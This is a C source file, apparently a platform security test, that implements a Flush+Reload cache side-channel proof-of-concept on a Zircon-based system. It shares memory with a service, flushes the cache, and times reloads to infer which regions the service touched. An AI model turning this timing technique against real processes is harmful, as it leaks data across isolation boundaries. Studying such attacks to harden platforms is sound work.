// Copyright 2020 GoldenRiver Technology Co., Ltd. All rights reserved.

/**
 * Try to use Flush-Reload method on side channel attack.
 * 1. Make shared memory with "app".
 * 2. Flush and invalid shared memory.
 * 3. Notify "app" to use this memory.
 * 	App will access only 256KB in 1MB shared memory.
 * 4. Reload this memory and judge which memory section is used by precise time.
 * 	Hacker read 8 bytes in two position of 0 and 512K for get reading time.
 * 	If time < average time, then this memory is in cache.
 * 	If time >= average time, then this memory is NOT in cache.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <zircon/syscalls.h>

#include <nbl_fwk/service.h>

#include "../common.h"

#define LOG_TAG "cache hacher"

#define SHM_MSG "hello service!"

static void analysis(char* data, int* hit) {
  zx_time_t* times = (zx_time_t*)malloc(STEP_COUNT * sizeof(zx_time_t));
  if (!times) {
    NBL_LOGE("Failed allocate %lu memory.\n", STEP_COUNT * sizeof(zx_time_t));
    return;
  }

  char ch;
  int j = 0;
  for (int i = 0; i < SHARED_MEM_SIZE; i++) {
    if (i % ACCESS_STEP == 0) {
      times[j] = zx_clock_get(ZX_CLOCK_MONOTONIC);
      ch = data[i];
      times[j] = zx_clock_get(ZX_CLOCK_MONOTONIC) - times[j];
      j++;
    }
  }

  // calculte average time of all times.
  zx_time_t average = 0;
  for (int i = 0; i < STEP_COUNT; i++) {
    average += times[i];
  }
  average = average / STEP_COUNT;

  // If time > avarage, no cache.
  // If time <= average, has cache.
  for (int i = 0; i < STEP_COUNT; i++) {
    if (times[i] < average) {
      // Maybe it has cache !
      hit[i]++;
    } else {
      // Maybe it has NOT cache !
      hit[i]--;
    }
  }

  free(times);

  // NBL_LOGI("Total is %d. Hit is %d.\n", COUNT, hit);
}

// Connect to service and create shared memory.
static int _run_service_a_demo() {
  int rc = NBL_NO_ERROR;
  nbl_chn_t* chn;
  char* srv_name = SRV_NAME;
  int cmd;
  nbl_stm_t* request;
  nbl_stm_t* response;
  nbl_shm_t* shm = NULL;
  void* shm_base;
  int ack;

  rc = nbl_chn_open(srv_name, NBL_TIMEOUT_INFINITY, &chn);
  if (rc != NBL_NO_ERROR) {
    NBL_LOGE("Connect to %s failed.\n", srv_name);
    goto connect_failed;
  }

  request = nbl_stm_create();
  response = nbl_stm_create();

  // allocate a shared memory.
  rc = nbl_shm_alloc(chn, SHARED_MEM_SIZE, NBL_SHM_PERM_RW, &shm, &shm_base);
  if (rc != NBL_NO_ERROR) {
    NBL_LOGE("Alloc shared memory failed (%d).\n", rc);
    goto alloc_shm_failed;
  }

  // send shared memory to service which will map the memory to itself.
  cmd = CMD_MAP_SHM;
  nbl_stm_add_int(request, cmd);
  nbl_stm_add_shm(request, shm);
  rc = nbl_chn_write_stm_sync(chn, request, response, NBL_TIMEOUT_INFINITY);
  if (rc != NBL_NO_ERROR) {
    NBL_LOGE("Invoke command (%d) failed.\n", cmd);
    goto send_shm_failed;
  } else {
    nbl_stm_next_int(response, &ack);
    NBL_LOGI("Invoke command get ack (%d).\n", ack);
  }

  // Send a message by shared memory to confirm it's OK.
  cmd = CMD_SEND_MSG;
  nbl_stm_add_int(request, cmd);
  strcpy((char*)shm_base, SHM_MSG);
  rc = nbl_chn_write_stm_sync(chn, request, response, NBL_TIMEOUT_INFINITY);
  if (rc != NBL_NO_ERROR) {
    NBL_LOGE("Invoke command (%d) failed.\n", cmd);
    goto send_shm_failed;
  } else {
    nbl_stm_next_int(response, &ack);
    NBL_LOGI("Invoke command get ack (%d).\n", ack);
  }

  NBL_LOGI("Start FR, SHARED_MEM_SIZE=%d, ACCESS_STEP=%d, STEP_COUNT=%d,\n",
           SHARED_MEM_SIZE, ACCESS_STEP, STEP_COUNT);
  NBL_LOGI("hit -> 1: maybe cache, -> -1, maybe no cache, ~0: unknown.\n");
  const int RUN_COUNT = 100;
  int hits[STEP_COUNT];
  int hit = 0;
  memset(hits, 0, sizeof(hits));
  for (int i = 0; i < RUN_COUNT; i++) {
    // flush cache
    zx_cache_flush(shm_base, SHARED_MEM_SIZE,
                   ZX_CACHE_FLUSH_DATA | ZX_CACHE_FLUSH_INVALIDATE);

    // notify service to use shared memory
    cmd = CMD_NOTIFY_DATA;
    nbl_stm_add_int(request, cmd);
    rc = nbl_chn_write_stm_sync(chn, request, response, NBL_TIMEOUT_INFINITY);
    if (rc != NBL_NO_ERROR) {
      NBL_LOGE("Invoke command (%d) failed.\n", cmd);
      goto send_buf_failed;
    } else {
      nbl_stm_next_int(response, &ack);
      // NBL_LOGI("Invoke command get ack (%d).\n", ack);
    }

    // calculate time and report result.
    analysis(shm_base, hits);
  }
  for (int i = 0; i < STEP_COUNT; i++) {
    NBL_LOGI("hit[%d] = %f.\n", i, hits[i] / (float)RUN_COUNT);
  }

  // unmap memory
  cmd = CMD_UNMAP_SHM;
  nbl_stm_add_int(request, cmd);
  rc = nbl_chn_write_stm_sync(chn, request, response, NBL_TIMEOUT_INFINITY);
  if (rc != NBL_NO_ERROR) {
    NBL_LOGE("Invoke command (%d) failed.\n", cmd);
    goto send_shm_failed;
  } else {
    nbl_stm_next_int(response, &ack);
    NBL_LOGI("Invoke command get ack (%d).\n", ack);
  }

  // free all resources.
  nbl_shm_free(shm);
  nbl_stm_destroy(request);
  nbl_stm_destroy(response);
  nbl_chn_close(chn);

  return NBL_NO_ERROR;

send_shm_failed:
  nbl_shm_free(shm);
alloc_shm_failed:
send_buf_failed:
send_int_failed:
  nbl_stm_destroy(request);
  nbl_stm_destroy(response);
  nbl_chn_close(chn);
connect_failed:
  return rc;
}

int main(int argc, char** argv) {
  int rc = NBL_NO_ERROR;

  rc = _run_service_a_demo();
  if (rc != NBL_NO_ERROR) {
    NBL_LOGE("Run service A demo failed (%d).\n", rc);
    exit(rc);
  } else {
    NBL_LOGI("Run demo A OK!\n");
  }

  return rc;
}
